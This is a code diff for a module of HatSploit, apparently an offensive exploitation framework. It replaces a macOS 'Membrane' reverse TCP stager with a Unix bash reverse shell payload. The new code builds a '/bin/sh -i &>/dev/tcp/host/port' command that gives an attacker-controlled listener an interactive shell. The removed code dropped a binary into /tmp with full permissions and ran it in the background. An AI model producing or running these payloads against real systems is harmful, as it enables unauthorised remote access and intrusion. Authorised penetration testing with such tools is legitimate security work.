@@ -24,34 +24,27 @@
 # SOFTWARE.
 #
 
-import base64
-
-from core.base.config import Config
 from core.lib.payload import Payload
-from data.payloads.macos.x64.membrane_reverse_tcp.core.session import HatSploitSession
 from utils.tcp.tcp import TCPClient
-from utils.string.string import StringTools
 
 
-class HatSploitPayload(Payload, TCPClient, StringTools):
-    config = Config()
-
+class HatSploitPayload(Payload, TCPClient):
     details = {
-        'Category': "stager",
-        'Name': "macOS x64 Membrane Reverse TCP",
-        'Payload': "macos/x64/membrane_reverse_tcp",
+        'Category': "single",
+        'Name': "Bash Shell Reverse TCP",
+        'Payload': "unix/generic/bash_reverse_tcp",
         'Authors': [
             'enty8080'
         ],
-        'Description': "Membrane reverse TCP payload for macOS x64.",
+        'Description': "Bash shell reverse TCP payload.",
         'Dependencies': [
             ''
         ],
         'Comments': [
             ''
         ],
-        'Architecture': "x64",
-        'Platform': "macos",
+        'Architecture': "generic",
+        'Platform': "unix",
         'Risk': "high",
         'Type': "reverse_tcp"
     }
@@ -68,34 +61,24 @@ class HatSploitPayload(Payload, TCPClient, StringTools):
             'Value': 8888,
             'Type': "port",
             'Required': True
+        },
+        'PROMPT': {
+            'Description': "Show shell prompt.",
+            'Value': "no",
+            'Type': "boolean",
+            'Required': False
         }
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
-
-        remote_data = base64.b64encode((local_host + ':' + local_port).encode())
-        remote_data = remote_data.decode()
+        local_host, local_port, prompt = self.parse_options(self.options)
 
         self.output_process("Generating payload...")
 
-        try:
-            binary = open(self.config.path_config['base_paths'][
-                              'data_path'] + 'libs/payloads/macos/x64/membrane_reverse_tcp/bin/membrane.bin', 'rb')
-            payload = binary.read()
-            binary.close()
-        except Exception:
-            self.output_error("Failed to generate payload!")
-            return
-
-        filename = self.random_string()
-
-        instructions = ""
-        instructions += f"cat >/tmp/{filename};"
-        instructions += f"chmod 777 /tmp/{filename};"
-        instructions += f"sh -c '/tmp/{filename} {remote_data}' 2>/dev/null &"
-        instructions += "\n"
+        if prompt in ['yes', 'y']:
+            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
+        else:
+            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
 
         self.payload = payload
-        self.instructions = instructions
-        self.session = HatSploitSession
+        self.instructions = payload
